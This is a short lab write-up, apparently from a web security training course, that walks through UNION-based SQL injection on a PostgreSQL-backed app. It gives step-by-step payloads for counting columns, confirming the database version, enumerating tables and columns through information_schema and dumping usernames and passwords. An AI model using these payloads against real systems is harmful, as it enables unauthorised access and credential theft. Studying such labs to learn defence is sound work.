# LAB 9: SQL injection attack, listing the database contents on non-Oracle database

## Goal: Enumerate tables → enumerate columns → dump user credentials. This lab typically runs PostgreSQL.

1. Identify number of columns
```bash
' ORDER BY 1--   works
' ORDER BY 2--   works
' ORDER BY 3--   internal serevr error
```
2 columns

2. Confirm string-compatible column
```bash
' UNION SELECT 'a','a'--   
```
Both columns accept TEXT.

3. Confirm DB type

Try:
```bash
' UNION SELECT version(), NULL-- 
```

If output resembles: PostgreSQL 12.5 on x86_64...
DB = PostgreSQL.

4. Enumerate all tables
PostgreSQL stores table names in:
information_schema.tables
Payload:
```bash
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
You will find something like:
users_fjyxpr

5. Enumerate columns from that table
```bash
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_fjyxpr'--
```

Output example:
- username_emkbgz
- password_wbaorp

6. Dump actual credentials
```bash
' UNION SELECT username_emkbgz, password_wbaorp FROM users_fjyxpr--
```

Use the displayed credentials of user administrator to complete the lab.
